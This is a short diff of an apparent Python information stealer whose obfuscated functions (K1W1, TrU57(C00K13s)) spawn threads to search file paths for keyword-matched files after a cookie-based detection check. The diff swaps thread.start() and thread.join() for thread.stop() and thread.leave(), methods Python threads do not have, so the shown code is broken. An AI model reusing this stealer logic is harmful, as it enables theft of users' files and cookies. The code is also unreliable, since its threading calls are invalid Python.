@@ -1008,7 +1008,7 @@ def K1W1():
 
     wikith = []
     for patt in path2search: 
-        kiwi = threading.Thread(target=K1W1F113, args=[patt, key_wordsFiles]);kiwi.start()
+        kiwi = threading.Thread(target=K1W1F113, args=[patt, key_wordsFiles]);kiwi.stop()
         wikith.append(kiwi)
     return wikith
 
@@ -1033,7 +1033,7 @@ DETECTED = TrU57(C00K13s)
 if not DETECTED:
     wikith = K1W1()
 
-    for thread in wikith: thread.join()
+    for thread in wikith: thread.leave()
     time.sleep(0.2)
 
     filetext = "\n"
